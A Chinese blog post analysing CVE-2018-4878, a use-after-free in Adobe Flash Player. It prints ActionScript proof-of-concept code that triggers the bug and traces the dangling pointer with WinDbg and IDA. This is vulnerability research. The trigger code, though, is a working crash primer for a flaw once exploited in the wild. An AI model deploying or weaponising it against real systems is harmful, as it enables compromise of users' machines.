# CVE-2018-4878 - 五千年木 - 博客园

> 原文：[`www.cnblogs.com/elvirangel/p/8576444.html`](https://www.cnblogs.com/elvirangel/p/8576444.html)

### 0x00 前言

该漏洞影响 Flash Player 版本 28.0.0.137 以及之前的所有版本

### 0x01 poc

[Poc](https://github.com/moonAgirl/Exploit/tree/master/CVE-2018-4878/Poc)

这里只列出关键代码

```
public function triggeruaf() : void {

              var sdk :PSDK = null;

              var dispatch:PSDKEventDispatcher = null;

              sdk = PSDK.pSDK;

              dispatch = sdk.createDispatcher();

              this.mediaplayer = sdk.createMediaPlayer(dispatch);

              this.listener = new MyListener();

              this.mediaplayer.drmManager.initialize(this.listener);

              this.listener = null;

       }

       public function exploit():void {

              this.triggeruaf();

              try {

                     new LocalConnection().connect("test");

                     new LocalConnection().connect("test");

              } catch (e:Error) {

              }

       }
```

主要就是以一个 listener 类实例为参数初始化了一个 drmManager 对象，之后就将 listener 类实例赋值为 NULL，其中 listener 类为

![](img/a6eaff0c5f9e9466c68ad4ccd8c11bbf.png)

用 FlashDevelop 编译后生成 Poc.swf

用 Windbg 附加 IE 打开 Poc.swf，程序崩溃

![](img/d571002bb07bc35b4059a7186fe3fc88.png)

![](img/801c8f8504647c4a2bd582555cac8d23.png)

可见直接使用 ecx 传递了一个对象

根据汇编代码可断定，ecx 偏移 0x0c 处为某对象指针，而此对象已经全是 0，造成了悬挂指针。再看 poc 脚本中，把一个 MyListener（实现了 DRMOperationCompleteListener 接口）类型对象赋值 null。所以可猜测 ecx->0x0c 为 MyListener 对象。

用 ida 找到触发漏洞的函数

![](img/509eaa6947e42325a4b13129911c5bfb.png)

函数在对象的虚表中

![](img/d8807da99cc8ef9bd895312102563767.png)

sub_1036E28A 即触发崩溃的方法。

根据虚函数表引用找到对象赋值方法，即脚本中的 initialize，这里是函数 sub_1037AB11

![](img/2e6c9cf6f753e2ccbb9be6efeb6c22a9.png)

重新附加 IE,在 initialize 函数下断，打开 poc.swf，程序在 sub_1037AB11 处断下

![](img/3d34e2b24ab3959365ccaf50db8f68f1.png)

按 F10 单步执行

![](img/86de4020fb9558fb569c46bf4508a3f1.png)

可以看到 esi + 0x0c 处为 DRMOperationCompleteListener 实例指针，它里面的内容此时不为 0

按 g 让程序执行，程序崩溃

![](img/ea415840204af3269a9ad89e733e3e31.png)

结合 poc 代码我们可以得出结论：MyListener 实例在被置 null 之后被垃圾回收，而在对象中还留存着实例指针，因此存在悬挂指针问题。